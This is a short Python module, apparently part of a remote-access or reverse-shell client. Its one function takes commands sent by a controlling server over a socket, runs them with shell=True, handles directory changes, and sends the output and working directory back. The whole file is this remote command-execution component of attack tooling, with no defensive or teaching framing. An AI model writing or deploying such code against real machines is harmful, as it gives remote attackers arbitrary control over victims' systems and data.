import subprocess
import os


def shell(client, cmd):
    """
    Executes shell commands from the server.
    :param client: Client socket object
    :param cmd: Command to operate in the shell
    """
    output_str = ''
    if cmd[:2] == 'cd' and len(cmd) > 2:
        try:
            os.chdir(cmd[3:].strip())
        except Exception as e:
            output_str = '[!] Could not change directory: {}\n'.format(e)
        else:
            output_str = ''
    elif len(cmd) > 0:
        try:
            cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode('utf-8', errors='replace')
        except Exception as e:
            output_str = '[!] Command execution unsuccessful: {}\n'.format(e)
            
    client.send(os.getcwd() + '>' + output_str)  # Sends message in the format of: "dir>output"
